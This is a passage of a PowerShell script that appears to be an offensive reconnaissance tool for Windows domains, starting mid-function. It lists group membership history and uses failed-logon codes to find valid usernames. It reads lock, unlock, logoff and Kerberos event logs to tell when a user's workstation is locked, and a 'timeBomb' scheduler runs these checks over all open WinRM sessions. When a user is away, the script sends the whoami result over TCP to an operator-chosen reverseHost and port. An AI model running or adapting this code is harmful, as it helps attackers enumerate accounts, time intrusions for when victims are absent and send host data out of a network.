			for($sidcounter=0;$sidcounter -lt $groupHistory.length; $sidcounter++)
			{
				if($mySIDarray -notcontains ($groupHistory[$sidcounter] | Select -Property "Security ID ")."Security ID ")
				{
					#https://learn-powershell.net/2014/09/13/quick-hits-sending-data-to-null/
					$mySIDarray.add(($groupHistory[$sidcounter] | Select -Property "Security ID ")."Security ID ") | Out-Null
				}
			}
         
			for($c=0;$c -lt $groupUsers.length;$c++)
			{
           
			   $userscn=$groupUsers[$c].Name
			   Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Enumerating $userscn group history"
			   $groupHistory | Group-Object {$_."Account Name"} | Where-object {$_.Name -match "$userscn"} | %{$_.Group} | Format-Table    #| Select -Property "Added to Security Group"
			   Write-Output "`n"
			   Write-Host "[*] " -ForegroundColor Yellow -Nonewline; Write-Output "Extra Information ..."
			   #Convert SID to username and get user groups,comments
			   $userSID=$mySIDarray[$c]
			   $accountName=([wmi]"win32_SID.SID='$userSID'").AccountName
			   $userBelongToGroups=Invoke-Command -ScriptBlock {net user $accountName /domain | Select-String "Global Group"}
			   $userComment=Invoke-Command -ScriptBlock {net user $accountName /domain | Select-String -Pattern "^comment"}
			   Write-Output "Username> $accountName"
			   Write-Host "[!] User is currently belong to> $userBelongToGroups" -ForegroundColor Green
			   Write-Host "$userComment" -ForegroundColor Red
			   Write-Output "`n"

			}
		}
    
        $event400_600_array=@(400,600)
        foreach($event400_600 in $event400_600_array)
        {
            if($event400_600 -eq 400)
            {
               
                Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (400) - Windows PowerShell"
                Write-Output "`n"
            }
            else
            {
                Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (600) - Windows PowerShell"
                Write-Output "`n"
            }

            try
            {
                $get400_600=Get-EventLog -Newest $using:newest -InstanceId $event400_600 -LogName "Windows Powershell" | select TimeGenerated,@{Name="HostApplication";Expression={$_.ReplacementStrings[2]}} | select TimeGenerated,HostApplication
                if(($get400_600 | Measure-Object).count -gt 0)
                {
                    $timeGenerated=($get400_600.TimeGenerated).DateTime
                    $hostApplication=($get400_600.HostApplication | findstr -i "HostApplication")
                    $engineVersion=($get400_600.HostApplication | findstr -i "EngineVersion")
                    #$hostPSVersion=Get-Host | Select Version
        
        
                    for($c=0;$c -lt $get400_600.length;$c++)
                    {
                        if($hostApplication[$c].Split("=") -ne "")
                        {
                            Write-Host $timeGenerated[$c]
                            #Write-Host "Host PowerShell: "$hostPSVersion.Version
                            Write-Host $hostApplication[$c].Split("=")[1]
                            if($engineVersion[$c].split("=")[1] -eq "")
                            {
                                Write-Host "Command PS Version: -"
                            }
                            else
                            {
                                Write-Host "Command PS Version:"$engineVersion[$c].split("=")[1]
                            }
                            Write-Output "`n"
                
                        }
            
                    }
                }
            }
            catch
            {
                <# Try/Catch Event 400/600#>
            }
        
        }

        
        $event500_501_array=@(500,501)
        foreach($event500_501 in $event500_501_array)
        {
            if($event500_501 -eq 500)
            {
               
                $event500_501=500
                Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (500) - Windows PowerShell"
                Write-Output "`n"
            }
            else
            {
                $event500_501=501
                Write-Host "[+] " -ForegroundColor Green -Nonewline; Write-Output "Information EventID (501) - Windows PowerShell"
                Write-Output "`n"
            }

            try
            {
                $get500_501=Get-EventLog -Newest $using:newest -InstanceId $event500_501 -LogName "Windows Powershell" | select TimeGenerated,PSComputerName,@{Name="Command";Expression={$_.ReplacementStrings[2]}} | select TimeGenerated,PSComputerName,Command
                if(($get500_501 | Measure-Object).count -gt 0)
                {
                    $timeGenerated=($get500_501 | Select TimeGenerated)
                    #$psComputerName=$get500_501.PsComputerName
                    $commandPath=($get500_501 | Select Command) | format-List | findstr -i "CommandPath"
                    $commandName=($get500_501 | Select Command) | format-List | findstr -i "CommandName"
                    $commandType=($get500_501 | Select Command) | format-List | findstr -i "CommandType"
                    $commandLine=($get500_501 | Select Command) | format-List | findstr -i "CommandLine"
                    $engineVersion=($get500_501 | Select Command) | format-list | findstr -i "EngineVersion"
                    #$hostPSVersion=Get-Host | Select Version
        
        
                    for($c=0;$c -lt $get500_501.length;$c++)
                    {
                        if($commandLine[$c].Split("=") -ne "")
                        {
                            Write-Host $timeGenerated[$c]
                            #Write-Host $psComputerName[$c]
                            if($commandName[$c].split("=")[1] -eq ""){Write-Host "CommandName: -"}else{Write-Host "CommandName: "$commandName[$c].split("=")[1].Trim(" ")}
                            if($commandType[$c].split("=")[1] -eq ""){Write-Host "CommandType: -"}else{Write-Host "CommandType: "$commandType[$c].split("=")[1].Trim(" ")}
                            if($commandPath[$c].split("=")[1] -eq ""){Write-Host "CommandPath: -"}else{Write-Host "CommandPath: "$commandPath[$c].split("=")[1].Trim(" ")}
                            if($commandLine[$c].split("=")[1] -eq ""){Write-Host "CommandLine: -"}else{Write-Host "CommandLine: "($commandLine[$c].split("=")[1]).Trim(" ")}
                            if($engineVersion[$c].split("=")[1] -eq ""){Write-Host "Command PS Version: -"}else{Write-Host "Command PS Version:"$engineVersion[$c].split("=")[1]}
                            Write-Output "`n"
                
                        }
            
                    }
                }
                

            }
            catch
            {
                <# Try/Catch event 500/501#>
            }
        
        }

    
	}<#### All event logs query just finished #####>

    #Display unique accounts for event 4624,4625,4776                    
    if($using:users) 
    {
        
        if($using:eventID -eq 4624) 
        {
    
                Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4624 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property @{Label="Usernames";Expression={$_.ReplacementStrings[5]}} | Group-Object 'Usernames' | Format-Table @{L='Valid Usernames';E={$_.Name}}
                #Get-EventLog -Newest  $using:newest -LogName Security -Instanceid 4625 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property @{Label="Username";Expression={$_.ReplacementStrings[5]}},@{Label="Status";Expression={if($_.ReplacementStrings[9] -eq "0xC0000064") { "Username doesn't exist!"} elseif ($_.ReplacementStrings[9] -eq "0xC000006A") {"Username is correct but the Password is wrong!"} elseif ($_.ReplacementStrings[9] -eq "0xC0000072") {"User is currently disabled!"} elseif ($_.ReplacementStrings[9] -eq "0xC0000234") {"User is currently Locked Out!"} }} | Group-Object Username,Status | Format-Table -Property Name 
    
        }
        elseif($using:eventID -eq 4625)                               
        {
    
                
                #Get-EventLog -Newest  $using:newest -LogName Security -Instanceid 4625 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property @{Label="Username";Expression={$_.ReplacementStrings[5]}},@{Label="Status";Expression={if($_.ReplacementStrings[9] -eq "0xC0000064") { "Username doesn't exist!"} elseif ($_.ReplacementStrings[9] -eq "0xC000006A") {"Username is correct but the Password is wrong!"} elseif ($_.ReplacementStrings[9] -eq "0xC0000072") {"User is currently disabled!"} elseif ($_.ReplacementStrings[9] -eq "0xC0000234") {"User is currently Locked Out!"} }} | Group-Object Username,Status | Format-Table -Property Name
                
                #Print only valid usernames
                Get-EventLog -Newest  $using:newest -LogName Security -Instanceid 4625 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property @{Label="Username";Expression={$_.ReplacementStrings[5]}},@{Label="Status";Expression={if($_.ReplacementStrings[9] -eq "0xC000006A") {"Username is correct but the Password is wrong!"} }} | Where-Object {$_.Status -eq "Username is correct but the Password is wrong!"} | Group-Object Username | Format-Table @{L='Valid Usernames';E={$_.Name}}
        }
        else
        {
                Get-EventLog -Newest $using:newest -LogName Security -Instanceid 4776 | Where {$_.message -notmatch "Account Name:\s*\w+\$"} | Select -Property @{Label="Username";Expression={$_.ReplacementStrings[1]}},@{Label="Error Type";Expression={$_.ReplacementStrings[3]}},@{Label="Status";Expression={if($_.ReplacementStrings[3] -eq "0xC0000064") { "Username doesn't exist!"} elseif($_.ReplacementStrings[3] -eq "0x0") { "Successful Authentication"} elseif ($_.ReplacementStrings[3] -eq "0xC000006A") {"Username is correct but the Password is wrong!"} elseif ($_.ReplacementStrings[3] -eq "0xC0000072") {"User is currently disabled!"} elseif ($_.ReplacementStrings[3] -eq "0xC0000234") {"User is currently Locked Out!"} }} | Group-Object Username,'Error Type',Status | Format-Table @{L='User information';E={$_.Name}}
        }

                                 
                        
     }

}




function testConnectivity($ip,$port)
{

    
    if(Test-Connection -BufferSize 32 -Count 1 -Quiet -ComputerName $ip)
    {
        try
        {
            $socket=new-object System.Net.Sockets.TcpClient($ip,$port)
        }
        catch
        {
            <# Nothing Here#>
            Write-Output "Port $port is closed!"
        }
    }

    if($socket.Connected)
    {
        

        Write-Output "Port $port is open!!"
        $socket.close()
    }
    

}


<# https://sion-it.co.uk/tech/powershell/loop-until-a-certain-time/ #>
function timeBomb
{
    [CmdletBinding()]
	Param([string]$task,[datetime]$at,[int]$loop,[datetime]$stoptime,[string]$newest,[string]$ip,[string]$reverseHost,[int]$reversePort)
    
    $currentTime=Get-Date
    [datetime]$p=$currentTime
    
    if($task -eq "now")
    {

        if($ip -match "127.0.0.1")
        {
            Invoke-Command -ScriptBlock ${function:checkLogOf} -ArgumentList $newest
        }
        else
        {
            
            $winrmUniqueSessionsID=Get-PSSession | Get-Unique
            for($x=0;$x -le ($winrmUniqueSessionsID).length;$x++)
            { 
               #Check if WinRM Table is not null 
               if($winrmUniqueSessionsID[$x])
               {
                    Invoke-Command -Session (Get-PSSession -Id $winrmUniqueSessionsID[$x].id) -ScriptBlock ${function:checkLogOf} -ArgumentList $newest
               }
            }


        }

     }
     elseif($task -eq "once")
     {

       
       $remaingMinutes=($at-(Get-Date)).Minutes
       $remaingSeconds=($at-(Get-Date)).Seconds
       

       if($ip -match '127.0.0.1')
        {
            
            Write-Host "[+] Task started at>"(Get-Date) -ForegroundColor Yellow
            Write-Host "[+] Left $remaingMinutes minute(s) for your task" -ForegroundColor Green
            Start-Sleep -Seconds (60*$remaingMinutes)
            Invoke-Command -ScriptBlock ${function:checkLogOf} -ArgumentList $newest
            
        }
        else
        {
            
            #Get-PSSession
            #[int]$winrmSessionsID=Read-Host -Prompt "Give session id to retrieve open WinRM connections"
            Write-Output "`n"
            Write-Host "[+] Task started at>"(Get-Date) -ForegroundColor Yellow
            Write-Host "[+] Left $remaingMinutes minute(s) for your task" -ForegroundColor Green
            Start-Sleep -Seconds (60*$remaingMinutes) 
            $winrmUniqueSessionsID=Get-PSSession | Get-Unique
            for($x=0;$x -le ($winrmUniqueSessionsID).length;$x++)
            { 
               if($winrmUniqueSessionsID[$x])
               {
               
                    Invoke-Command -Session (Get-PSSession -Id $winrmUniqueSessionsID[$x].id) -ScriptBlock ${function:checkLogOf} -ArgumentList $newest
               }
            
            }
        }

     }
     elseif($task -eq "trigger")
     {

        if($at -and $loop -and $stoptime)
        {
            [datetime]$TimeStart = $at
            [datetime]$TimeEnd = $stoptime.addminutes($loop)
            Write-Host "Start Time: $TimeStart"
            write-host "End Time:   $TimeEnd"

            $now=Get-Date
            while($now -lt $at)
            {
                $now=Get-Date
                Start-Sleep -Seconds 10
            }
            #setup loop
            

            do 
            { 
                $TimeNow = Get-Date
                if ($TimeNow -ge $TimeEnd) 
                {
                     Write-host "It's time to finish."
                } 
                else 
                {
                    
                    if($ip -match '127.0.0.1')
                    {
            
                        Write-Host "[+] Task started at>"(Get-Date) -ForegroundColor Yellow
                        Write-Host "[+] Left $remaingMinutes minute(s) for your task" -ForegroundColor Green
                        Start-Sleep -Seconds (60*$remaingMinutes)
                        Invoke-Command -ScriptBlock ${function:checkLogOf} -ArgumentList $newest,$pythonconnectback
            
                    }
                    else
                    {
            
                        #Get-PSSession
                        #[int]$winrmSessionsID=Read-Host -Prompt "Give session id to retrieve open WinRM connections"
                        Write-Output "`n"
                        Write-Host "[+] Task started at>"(Get-Date) -ForegroundColor Yellow
                        Write-Host "[+] Left $remaingMinutes minute(s) for your task" -ForegroundColor Green
                        Start-Sleep -Seconds (60*$remaingMinutes)
                        $winrmUniqueSessionsID=Get-PSSession | Get-Unique
                        for($x=0;$x -le ($winrmUniqueSessionsID).length;$x++)
                        { 
                            if($winrmUniqueSessionsID[$x])
                            {
                                Invoke-Command -Session (Get-PSSession -Id $winrmUniqueSessionsID[$x].id) -ScriptBlock ${function:checkLogOf} -ArgumentList $newest
                            }
                        
                        }
                    }


                }

                $delay=$loop*(60/1) #convert minutes to seconds
                Start-Sleep -Seconds $delay
             }
             until ($TimeNow -ge $TimeEnd)
             
            

        }
        else
        {
            Write-Host "[-] You need at/loop/stoptime flags" -ForegroundColor Yellow
        }

     
      }

}


function checkLogOf($newest)
{
    

    #[array]$hostUsers= Get-ChildItem -Path "c:\users" | %{$_.Name}
	Write-Host "[!] " -ForegroundColor Green -NoNewline; Write-Host "Enumerating users ..."
    [array]$hostUsers=Get-ChildItem 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\ProfileList' | ForEach-Object { $_.GetValue('ProfileImagePath') } | Where-Object {$_ -match "c:\\users"} | Where-Object {$_ -match "c:\\users"} | foreach {( $_ -split "c:\\users\\")[1]}
    Write-Host "[!] " -ForegroundColor Green -NoNewline; Write-Host "Doing some checks ..."
    $auditPolPath="c:\windows\temp\Auditpol.csv"
   
    #check if auditpol.csv exists, if yes remove it
    if([System.IO.File]::Exists($auditPolPath))
    {
        Remove-Item -Path $auditPolPath
        $exportPolicy=Invoke-Command -ScriptBlock {auditpol /backup /file:$auditPolPath}
        #$exportPolicy=Invoke-Expression -Command "c:\windows\system32\cmd.exe /c auditpol /backup /file:$auditPolPath"
    }
    else
    {
        $exportPolicy=Invoke-Command -ScriptBlock {auditpol /backup /file:$auditPolPath}
       
       
    }
    $readPolicyContents=Get-content $auditPolPath
    $policyContentsArray=($readPolicyContents | Select-String "Account Lockout") -split ","
    #Validate that events 4800/4801, 4802/4803 exists
    if(($policyContentsArray | Select-String -Pattern "Success|Failure"))
    {
        #Lockout Policy exists
        Write-Host "[+] " -foregroundcolor Green -Nonewline;Write-Host "Lockout policy found ..."
        Write-Output "`n"
    }
    else
    {
        Write-Host "[-] " -foregroundcolor Yellow -Nonewline; Write-Host "Lockout Policy not found ..."
        Write-Output "`n"
    }

    
    #check if events 4800/4801, 4802/4803 exists, if yes add to eventArray
    $eventArray = New-Object System.Collections.ArrayList
               
    for($usercounter=0;$usercounter -lt $hostUsers.Length;$usercounter++)
    {
        $currentUser=$hostUsers[$usercounter]
        try
        {
            $results4800_1=Get-EventLog -LogName Security -Instanceid 4800 -ErrorAction stop | Where {$_.message -match "Account Name:\s*$currentUser"}
            if($results4800_1)
            {
                #check if $eventArray contains 4800, if not then added
                if(!$eventArray.Contains(4800))
                {
                    $eventArray.add(4800) | Out-Null
                }
            }
        
        }
        catch
        {
            Write-Host "[-] " -ForegroundColor Red -NoNewline; Write-Host "No logs found for user $currentUser / eventID 4800/4801"
        }
        
        try
        {
             $results4802_3=Get-EventLog -LogName Security -Instanceid 4802 -ErrorAction Stop| Where {$_.message -match "Account Name:\s*$currentUser"}
             
             if($results4802_3)
             {
                #check if $eventArray 4802, if not then added
                if(!$eventArray.contains(4802))
                {
                    $eventArray.add(4802) | Out-Null
                }
             }

        }
        catch
        {
             Write-Host "[-] " -ForegroundColor Red -Nonewline; Write-Host "No logs found for user $currentUser / eventID 4802/4803"
             write-output "`n"
        }

        
        
    
    }
    
    
    $events = New-Object System.Collections.ArrayList
    

    #In try block check if "newest" number is more than existing log files.
    #try
    #{ 
    for($usercounter=0;$usercounter -lt $hostUsers.Length;$usercounter++)
    {#1

        
        $currentUser=$hostUsers[$usercounter]
        #-after ([datetime]::Today)
        try
        { 
            
            $lastloggof=Get-EventLog -LogName Security -Instanceid 4647 -newest $newest -ErrorAction Stop | Where {$_.message -match "Account Name:\s*$currentUser"} | Select -Property TimeGenerated,MachineName,@{Name="Username";Expression={$_.ReplacementStrings[1]}} | Select-Object -first 1
            #$lastloggof
            if(!$lastloggof)
            {
                $lastloggof=""
            }
            
        }
        catch
        {
              Write-Host "[-] " -ForegroundColor Red -Nonewline; Write-Host "No logs found for user $currentUser / eventID 4647"
              
        }
        
        try
        {
            
            $lastloggon=Get-EventLog -LogName Security -Instanceid 4624 -newest $newest -ErrorAction stop | Where {($_.message -match "Account Name:\s*$currentUser") -and ($_.message -notmatch "Security ID:\s*S-1-0-0")} | Select -Property TimeGenerated,MachineName,@{Name="Username";Expression={$_.ReplacementStrings[5]}} | Select-Object -first 1
            if(!$lastloggon)
            {
                $lastloggon=""
            }
        
        }
        catch
        {
            
            Write-Host "[-] " -ForegroundColor Red -NoNewline; Write-Host "logs found for user $currentUser / eventID 4624"
        }
        
        
        
        #check if lastloggof,lastloggon is null before converting to datetime
        if(($lastloggof -and $lastloggon) -ne "")
        {#2
            #Convert to datetime
            [datetime]$lastloggof1=$lastloggof.TimeGenerated
            [datetime]$lastloggon1=$lastloggon.TimeGenerated
            $userlogofStateCalc=$lastloggon1-$lastloggof1
           
            #Check if user is logged on
            [float]$logoftotalMilliseconds=$userlogofStateCalc.TotalMilliseconds
            #Write-Host "[!] " -ForegroundColor Green -NoNewline;Write-Host "Checking Logof events ..."
            if($logoftotalMilliseconds -ge 0)
            {#3
               
               
               #Write-Host "[!] User $currentUser is logged on" -ForegroundColor Yellow
               $events.Clear() 
               for($x=0;$x -lt $eventArray.count;$x++)
               {#3.5
                                           
                    
                    ($events.Add((Get-EventLog -LogName Security -Instanceid $eventArray[$x] -newest $newest | Where {$_.message -match "Account Name:\s*$currentUser"} | Select -Property TimeGenerated,MachineName,@{Name="Username";Expression={$_.ReplacementStrings[1]}} | Select-Object -first 1).TimeGenerated)) | Out-Null
                    
                    ($events.Add((Get-EventLog -LogName Security -Instanceid ($eventArray[$x]+1) -newest $newest | Where {($_.message -match "Account Name:\s*$currentUser") -and ($_.message -notmatch "Security ID:\s*S-1-0-0")} | Select -Property TimeGenerated,MachineName,@{Name="Username";Expression={$_.ReplacementStrings[5]}} | Select-Object -first 1).TimeGenerated)) | Out-Null
                    
                              
                    #check if the event is 4800/4801 or 4802/4803 
                    ####################################################################################################################################################################
                    if($eventArray[$x] -eq 4800)
                    {#4
                   
                        $userlockoutStateCalc2=$events[3]-$events[2]
                        [float]$lockouttotalMilliseconds2=$userlockoutStateCalc2.TotalMilliseconds
                        
                        if($lockouttotalMilliseconds2 -ge 0)
                        {#5
                        
                            #write-Host "[-] The screen saver is dismissed -"$eventArray[$x]"/"($eventArray[$x]+1)"event IDs" -ForegroundColor Yellow
                            #write-Host "[-] The screen saver is dismissed" -ForegroundColor Yellow
                            <#SCREENSAVER OUTPUT / NOTHING HERE#>

                            
                            $userlockoutStateCalc=$events[1]-$events[0]
                            [float]$lockouttotalMilliseconds=$userlockoutStateCalc.TotalMilliseconds
                            
                            if($lockouttotalMilliseconds -ge 0)
                            {#6
                                    
                                    #write-Host "[-] The workstation is unlocked -"$eventArray[$x]"/"($eventArray[$x]+1)"event IDs" -ForegroundColor Yellow
                                    #write-Host "[-] The workstation is unlocked" -ForegroundColor Yellow
                                    
                                    #4779->A session was disconnected from a Window Station
                                    try
                                    {
                                        $getLast4779 = Get-EventLog -LogName Security -Instanceid 4779 -newest $newest -ErrorAction Stop | Where {$_.message -match "Account Name:\s*$currentUser"} | Select -property MachineName,TimeGenerated,@{Name="Username";Expression={$_.ReplacementStrings[0]}},@{Name="Domain";Expression={$_.ReplacementStrings[1]}} | Select-Object -first 1
                                    }
                                    catch
                                    {
                                        try
                                        {
                                            $getLast4779_count=(Get-EventLog -LogName Security -Instanceid 4779 -ErrorAction Stop).Count
                                        }
                                        catch
                                        {
                                            $getLast4779_count = 0
                                        }
                                        Write-Host "[-] " -ForegroundColor Red -NoNewline;Write-Host "You enter $newest but eventID-4779 has $getLast4779_count entries"
                                        Write-Output "`n"
                                    }
                                            
                                    #4768->A Kerberos authentication ticket (TGT) was requested
                                    try
                                    {
                                        $getLast4768 = Get-EventLog -LogName Security -Instanceid 4768 -newest $newest -ErrorAction Stop| Where {$_.message -match "Account Name:\s*$currentUser"} | Select -property MachineName,TimeGenerated,@{Name="Username";Expression={$_.ReplacementStrings[0]}},@{Name="SID";Expression={$_.ReplacementStrings[2]}},@{Name="Domain";Expression={$_.ReplacementStrings[1]}},@{Name="Client Address";Expression={$_.ReplacementStrings[9]}},@{Name="Client Port";Expression={$_.ReplacementStrings[10]}} | Select-Object -first 1
                                    }
                                    catch
                                    {
                                        try
                                        {
                                            $getLast4768_count=(Get-EventLog -LogName Security -Instanceid 4768 -ErrorAction Stop).Count
                                        }
                                        catch
                                        {
                                            $getLast4768_count = 0
                                        }
                                        Write-Host "[-] " -ForegroundColor Red -NoNewline;Write-Host "You enter $newest but eventID-4768 has $getLast4768_count entries"
                                        Write-Output "`n"
                                    }
                                           
                                    #4634->An account was logged off
                                    try
                                    {
                                        $getLast4634 = Get-EventLog -LogName Security -Instanceid 4634 -newest $newest -ErrorAction Stop | Where {$_.message -match "Account Name:\s*$currentUser"} | Select -property MachineName,TimeGenerated,@{Name="Account Name";Expression={$_.ReplacementStrings[1]}},@{Name="SID";Expression={$_.ReplacementStrings[0]}},@{Name="Domain";Expression={$_.ReplacementStrings[2]}} | Select-Object -First 1
                                    }
                                    catch
                                    {
                                        try
                                        {
                                            $getLast4634_count = (Get-EventLog -LogName Security -Instanceid 4634 -ErrorAction Stop).Count
                                        }
                                        catch
                                        {
                                            $getLast4634_count = 0
                                        }
                                        Write-Host "[-] " -ForegroundColor Red -Nonewline; Write-Host "You enter $newest but eventID-4634 has $getLast4634_count entries"
                                        Write-Output "`n"
                                    }

                                    #$getLast4672 = Get-EventLog -LogName Security -Instanceid 4672 -newest $newest | Where {$_.message -match "Account Name:\s*$currentUser"} | Select -property MachineName,TimeGenerated,@{Name="Account Name";Expression={$_.ReplacementStrings[1]}},@{Name="SID";Expression={$_.ReplacementStrings[0]}},@{Name="Domain";Expression={$_.ReplacementStrings[2]}} | select-object -First 1
                                    #$t4672=$getLast4672.TimeGenerated
                                   
                                    #Calculator
                                    if($getLast4768.TimeGenerated)
                                    {
                                        $t4768=$getLast4768.TimeGenerated
                                    }
                                    else
                                    {
                                        [datetime]$t4768 = 0
                                    }

                                    if($getLast4634.TimeGenerated)
                                    {

                                        $t4634=$getLast4634.TimeGenerated
                                    }
                                    else
                                    {
                                        [datetime]$t4634 = 0
                                    }

                                    if($getLast4779.TimeGenerated)
                                    {
                                        $t4779=$getLast4779.TimeGenerated
                                    }
                                    else
                                    {
                                        [datetime]$t4779=0
                                    }


                                    $tmpTime = $t4768-$t4779
                                    $tmpTime2 = $t4768 - $t4634
                                    
                                    #Get domain name from the event4779, else use wmi
                                    if($getLast4779.Domain)
                                    {    
                                        $domainName=$getLast4779.Domain
                                    }
                                    else
                                    {
                                        $domainName=(Get-WmiObject Win32_ComputerSystem).Domain
                                    }
                                    

                                    if($tmpTime.TotalMilliseconds -ge 0)
                                    {#7
                                        Write-Host "[-] The Workstation is unlocked | User $domainName\$currentUser is in!" -ForegroundColor Yellow
                                        #Write-Output "`n"
                                    }
                                    else
                                    {
                                        Write-Host "[+] The Workstation is locked | User $domainName\$currentUser is in NOT in!" -ForegroundColor Green
                                        #Write-Output "`n"
                                    }#7
                                    
                            }
                            else
                            {
                                            
                                     
                                    #4779->A session was disconnected from a Window Station
                                    try
                                    {
                                        $getLast4779 = Get-EventLog -LogName Security -Instanceid 4779 -newest $newest -ErrorAction Stop| Where {$_.message -match "Account Name:\s*$currentUser"} | Select -property MachineName,TimeGenerated,@{Name="Username";Expression={$_.ReplacementStrings[0]}},@{Name="Domain";Expression={$_.ReplacementStrings[1]}} | Select-Object -first 1
                                    }
                                    catch
                                    {
                                        try
                                        {
                                            $getLast4779_count = (Get-EventLog -LogName Security -Instanceid 4779 -ErrorAction Stop).Count
                                        }
                                        catch
                                        {
                                            $getLast4779_count = 0
                                        }
                                        Write-Host "[-] " -Foregroundcolor Red -Nonewline; Write-Host "You enter $newest but eventID-4779 has $getLast4779_count entries"
                                        Write-Output "`n"
                                    }
                                            
                                    #4768->A Kerberos authentication ticket (TGT) was requested
                                    try
                                    {
                                        $getLast4768 = Get-EventLog -LogName Security -Instanceid 4768 -newest $newest -ErrorAction Stop| Where {$_.message -match "Account Name:\s*$currentUser"} | Select -property MachineName,TimeGenerated,@{Name="Username";Expression={$_.ReplacementStrings[0]}},@{Name="SID";Expression={$_.ReplacementStrings[2]}},@{Name="Domain";Expression={$_.ReplacementStrings[1]}},@{Name="Client Address";Expression={$_.ReplacementStrings[9]}},@{Name="Client Port";Expression={$_.ReplacementStrings[10]}} | Select-Object -first 1
                                    }
                                    catch
                                    {
                                        try
                                        {
                                            $getLast4768_count = (Get-EventLog -LogName Security -Instanceid 4768 -ErrorAction Stop).Count
                                        }
                                        catch
                                        {
                                            $getLast4768_count = 0
                                        }

                                        Write-Host "[-] " -ForegroundColor Red -NoNewline; Write-Host "You enter $newest but eventID-4768 has $getLast4768_count entries"
                                        Write-Output "`n"
                                    } 
                                           
                                    #4634->An account was logged off
                                    try
                                    {
                                        $getLast4634 = Get-EventLog -LogName Security -Instanceid 4634 -newest $newest -ErrorAction Stop | Where {$_.message -match "Account Name:\s*$currentUser"} | Select -property MachineName,TimeGenerated,@{Name="Account Name";Expression={$_.ReplacementStrings[1]}},@{Name="SID";Expression={$_.ReplacementStrings[0]}},@{Name="Domain";Expression={$_.ReplacementStrings[2]}} | Select-Object -First 1
                                    }
                                    catch
                                    {
                                        try
                                        {
                                            $getLast4634_count = (Get-EventLog -LogName Security -Instanceid 4634 -ErrorAction Stop).Count
                                        }
                                        catch
                                        {
                                            $getLast4634_count = 0
                                        }

                                        Write-Host "[-] " -foregroundcolor Red -Nonewline;Write-Host "You enter $newest but eventID-4634 has $getLast4634_count entries"
                                        Write-Output "`n"

                                    }
                                            
                                    #4800->The workstation was locked
                                    try
                                    {
                                        $getLast4800 = Get-EventLog -LogName Security -Instanceid 4800 -newest $newest -ErrorAction Stop | Where {$_.message -match "Account Name:\s*$currentUser"} | Select -Property TimeGenerated,MachineName,@{Name="Username";Expression={$_.ReplacementStrings[1]}} | Select-Object -first 1
                                    }
                                    catch
                                    {
                                        try
                                        {
                                            $getLast4800_count = (Get-EventLog -LogName Security -Instanceid 4800 -ErrorAction Stop).Count
                                        }
                                        catch
                                        {
                                            $getLast4800_count = 0     
                                        }
                                        
                                        Write-Host "[-] " -foregroundColor Red -Nonewline;Write-Host "You enter $newest but eventID-4800 has $getLast4800_count entries"
                                        Write-Output "`n"
                                    }

                                    #4672->Special privileges assigned to new logon
                                    #$getLast4672 = Get-EventLog -LogName Security -Instanceid 4672 -newest $newest | Where {$_.message -match "Account Name:\s*$currentUser"} | Select -property MachineName,TimeGenerated,@{Name="Account Name";Expression={$_.ReplacementStrings[1]}},@{Name="SID";Expression={$_.ReplacementStrings[0]}},@{Name="Domain";Expression={$_.ReplacementStrings[2]}} | select-object -First 1
                                    #$t4672=$getLast4672.TimeGenerated
                                            
                                    #Calculator, Check if any of the event TimeGenerated is null
                                    
                                    if($getLast4768.TimeGenerated)
                                    {
                                        $t4768=$getLast4768.TimeGenerated
                                    }
                                    else
                                    {
                                        [datetime]$t4768=0
                                        
                                    }

                                    if($getLast4779.TimeGenerated)
                                    {
                                        $t4779=$getLast4779.TimeGenerated
                                    }
                                    else
                                    {
                                        [datetime]$t4779=0
                                       
                                    }
                                    
                                    if($getLast4634.TimeGenerated)
                                    {
                                        $t4634=$getLast4634.TimeGenerated
                                    }
                                    else
                                    {
                                        [datetime]$t4634=0
                                       
                                    }

                                    if($getLast4800.TimeGenerated)
                                    {
                                        $t4800=$getLast4800.TimeGenerated
                                    }
                                    else
                                    {
                                        [datetime]$t4800=0
                                        
                                    }
                                     
                                    #Get domain form 4779 event, if event is null then get domain from wmi
                                    if($getLast4779.Domain)
                                    {    
                                        $domainName=$getLast4779.Domain
                                    }
                                    else
                                    {
                                        $domainName=(Get-WmiObject Win32_ComputerSystem).Domain
                                    }
                                   
                                    $tmpTime = $t4768-$t4779
                                    $tmpTime2 = $t4768 - $t4800
                                    
                                   

                                    
                                    if($tmpTime.TotalMilliseconds)
                                    {
                                        $p=$tmpTime.TotalMilliseconds 
                                    }
                                    else
                                    {
                                        $p=0
                                    }

                                    if($tmpTime2.TotalMilliseconds)
                                    {
                                        $k=$tmpTime2.TotalMilliseconds 
                                    }
                                    else
                                    {
                                        $k=0
                                    }
                                    

                                    if(($p -ge 0) -and ($k -ge 0))
                                    {
                                        
                                        Write-Host "[-] The workstation is unlocked | User $domainName\$currentUser is in!" -ForegroundColor Yellow
                                        Write-Output "`n"
                                    }
                                    else
                                    {
                                        Write-Host "[+] The workstation is locked | User $domainName\$currentUser is NOT in!" -ForegroundColor Green
                                        if(($using:reverseHost -and $using:reversePort) -ne "")
                                        {
                                                Invoke-Command -ScriptBlock {

                    
                                                           $whoami=whoami
                                                           $TcpClient = New-Object System.Net.Sockets.TcpClient
	                                                       try
                                                           {
                                                                    $Tcpclient.Connect($using:reverseHost,$using:reversePort)
                                                                    $t=$Tcpclient.GetStream()
	                                                                $data=[System.Text.Encoding]::ASCII.GetBytes($whoami)
	                                                                $t.Write($data,0,$data.length)

                                                           }
                                                           catch
                                                           {
                                                                     Write-Host "No connection could be made with $using:reverseHost on port $using:reversePort"
                                                           }
                           
                                                }

                                         }
                                         else
                                         {
                                                Write-Host "[!] You can provide -reverseHost and -reversePort flags to send the results to the server!" -ForegroundColor Yellow
                                                Write-Output "`n"
                                         }

                                    
                                    
                                     }
                                    

                                            <#$sessionConnected=Get-EventLog -LogName Security -Instanceid 4778 -newest 1 | Where {$_.message -match "Account Name:\s*"}
